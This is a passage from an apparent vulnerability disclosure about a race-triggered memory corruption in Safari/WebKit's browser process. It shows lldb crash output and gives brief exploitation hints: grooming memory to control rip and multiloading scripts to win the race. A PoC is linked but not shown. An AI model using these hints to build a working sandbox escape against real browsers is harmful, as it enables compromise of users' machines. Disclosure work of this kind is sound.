12  com.apple.AppKit                  0x00007fff2ea3c71f -[NSApplication(NSEvent) _nextEventMatchingEventMask:untilDate:inMode:dequeue:] + 1361
13  com.apple.Safari.framework        0x000000010102902a -[BrowserApplication nextEventMatchingMask:untilDate:inMode:dequeue:] + 273
14  com.apple.AppKit                  0x00007fff2ea3683c -[NSApplication run] + 699
15  com.apple.AppKit                  0x00007fff2ea25d7c NSApplicationMain + 777
16  libdyld.dylib                     0x00007fff5d2e63d5 start + 1

Thread 0 crashed with X86 Thread State (64-bit):
  rax: 0x0000000103c2b8e0  rbx: 0x00000001095469c0  rcx: 0x0000000000000015  rdx: 0x0000000000000016
  rdi: 0x00000001095c2700  rsi: 0x0a1d800103c70ac5  rbp: 0x00007ffeef097370  rsp: 0x00007ffeef0972d8
   r8: 0x00000000000001ff   r9: 0x00000000000007fb  r10: 0x0000000000001660  r11: 0x0000000000000020
  r12: 0x0000000000000000  r13: 0x0000000000000000  r14: 0x000000010951dd88  r15: 0x00000001095c2700
  rip: 0xfffffffffffffff8  rfl: 0x0000000000010257  cr2: 0xfffffffffffffff8
  
Logical CPU:     10
Error Code:      0x00000014
Trap Number:     14


(lldb) c
Process 38981 resuming
Process 38981 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0xfffffffffffffff8)
    frame #0: 0xfffffffffffffff8
error: memory read failed for 0xfffffffffffffe00
Target 0: (Safari Technology Preview) stopped.
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0xfffffffffffffff8)
  * frame #0: 0xfffffffffffffff8
    frame #1: 0x00000001036e1fe7 WebKit`WebKit::WebProcessProxy::didBecomeUnresponsive() + 347
    frame #2: 0x0000000101caac63 JavaScriptCore`WTF::RunLoop::TimerBase::timerFired(__CFRunLoopTimer*, void*) + 35
    frame #3: 0x00007fff313d7a60 CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 20
    frame #4: 0x00007fff313d760c CoreFoundation`__CFRunLoopDoTimer + 851
    frame #5: 0x00007fff313d7152 CoreFoundation`__CFRunLoopDoTimers + 330
    frame #6: 0x00007fff313b8362 CoreFoundation`__CFRunLoopRun + 2130
    frame #7: 0x00007fff313b78be CoreFoundation`CFRunLoopRunSpecific + 455
    frame #8: 0x00007fff306a396b HIToolbox`RunCurrentEventLoopInMode + 292
    frame #9: 0x00007fff306a36a5 HIToolbox`ReceiveNextEventCommon + 603
    frame #10: 0x00007fff306a3436 HIToolbox`_BlockUntilNextEventMatchingListInModeWithFilter + 64
    frame #11: 0x00007fff2ea3d987 AppKit`_DPSNextEvent + 965
    frame #12: 0x00007fff2ea3c71f AppKit`-[NSApplication(NSEvent) _nextEventMatchingEventMask:untilDate:inMode:dequeue:] + 1361
    frame #13: 0x0000000100cf002a Safari`-[BrowserApplication nextEventMatchingMask:untilDate:inMode:dequeue:] + 273
    frame #14: 0x00007fff2ea3683c AppKit`-[NSApplication run] + 699
    frame #15: 0x00007fff2ea25d7c AppKit`NSApplicationMain + 777
    frame #16: 0x00007fff5d2e63d5 libdyld.dylib`start + 1
(lldb) frame select 1
frame #1: 0x00000001036e1fe7 WebKit`WebKit::WebProcessProxy::didBecomeUnresponsive() + 347
WebKit`WebKit::WebProcessProxy::didBecomeUnresponsive:
->  0x1036e1fe7 <+347>: testb  %al, %al
    0x1036e1fe9 <+349>: je     0x1036e2066               ; <+474>
    0x1036e1feb <+351>: leaq   0x3e350e(%rip), %rax      ; WebKit2LogPerformanceLogging
    0x1036e1ff2 <+358>: movq   0x20(%rax), %r14
(lldb) x/16i $pc-0x8
    0x1036e1fdf: 8b 07                 movl   (%rdi), %eax
    0x1036e1fe1: 4c 89 ff              movq   %r15, %rdi
    0x1036e1fe4: ff 50 40              callq  *0x40(%rax)
->  0x1036e1fe7: 84 c0                 testb  %al, %al
    0x1036e1fe9: 74 7b                 je     0x1036e2066               ; <+474>
    0x1036e1feb: 48 8d 05 0e 35 3e 00  leaq   0x3e350e(%rip), %rax      ; WebKit2LogPerformanceLogging
    0x1036e1ff2: 4c 8b 70 20           movq   0x20(%rax), %r14
    0x1036e1ff6: be 10 00 00 00        movl   $0x10, %esi
    0x1036e1ffb: 4c 89 f7              movq   %r14, %rdi
    0x1036e1ffe: e8 e7 53 27 00        callq  0x1039573ea               ; symbol stub for: os_log_type_enabled
    0x1036e2003: 84 c0                 testb  %al, %al
    0x1036e2005: 74 57                 je     0x1036e205e               ; <+466>
    0x1036e2007: 48 89 e3              movq   %rsp, %rbx
    0x1036e200a: 49 89 e0              movq   %rsp, %r8
    0x1036e200d: 49 83 c0 e0           addq   $-0x20, %r8
    0x1036e2011: 4c 89 c4              movq   %r8, %rsp
(lldb) reg r
General Purpose Registers:
       rbx = 0x0000000104e653c0
       rbp = 0x00007ffeeefe7370
       rsp = 0x00007ffeeefe72e0
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000104eea108
       r15 = 0x0000000104ec2700
       rip = 0x00000001036e1fe7  WebKit`WebKit::WebProcessProxy::didBecomeUnresponsive() + 347
13 registers were unavailable.                                                                                             
(lldb) 
```

as you can see rax is pointing to junk memory.<br>
given rce in the renderer, one can groom this memory<br>
to controll rip.<br>

NOTE: multiloading (of scripts etc..) are necessary in order to win the race.<br>
it would make the loop annotated in [1] run slower..<br>

'/broker_rip_to_hell' can be found <a href="/broker_rip_to_hell">here</a>.<br>

this bug is fairly simple, so i wont describe it in more details.<br><br>

NOTE: this bug can trigger a memory curroption in the browser process even without rce in the renderer,<br>
historically this is rated as a critical bug: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=558589">example</a><br>
but i guess this bug is so obvious (and this code is used frequently), that it was also found by a regression test...<br>

# final notes

this lazy exploitation approach would not work on microsoft products,<br>
due to CFG. and after dealing with MS last year it looks like<br>
apple realy needs to consider implementing more mitigations on there desktop platform.<br>

# poc code

but here is a poc code to control $pc <a href="/p.html">#</a>

